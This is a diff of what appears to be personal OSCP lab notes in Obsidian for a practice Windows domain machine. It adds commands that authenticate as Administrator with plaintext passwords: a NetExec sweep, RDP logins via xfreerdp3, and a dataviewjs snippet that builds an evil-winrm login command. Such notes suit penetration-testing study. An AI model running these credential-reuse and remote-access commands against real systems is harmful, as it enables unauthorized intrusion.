@@ -1,7 +1,7 @@
 [[Editing Copy Page]]
 
 ```
-smbclient -U V.Ventz -L //192.168.242.175/Password Audit
+Administrator:ItachiUchiha888
 ```
 
 ```
@@ -21,20 +21,25 @@ xfreerdp3 /u:V.Ventz /p:'HotelCalifornia194!' /v:192.168.242.175
 ```
 
 ```
-
+cd ~/Desktop/Tools/Windows && ./nxc-sweep 192.168.242.175 -u 'Administrator' -p 'ItachiUchiha888'
 ```
 
 ```
-
+xfreerdp3 /u:resourced.local\Administrator /p:ItachiUchiha888 /v:192.168.242.175 /cert:ignore /dynamic-resolution +clipboard
 ```
 
 ```
-
+xfreerdp3 /u:resourced.local\\Administrator /p:'ItachiUchiha888' /v:192.168.242.175
 ```
 
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";
+
+const command = `evil-winrm -i ${ip} -u L.Livingstone -p 'ItachiUchiha888'`;
+
+dv.paragraph("```bash\n" + command + "\n```");
 ```
 
-```
 
 ```
 
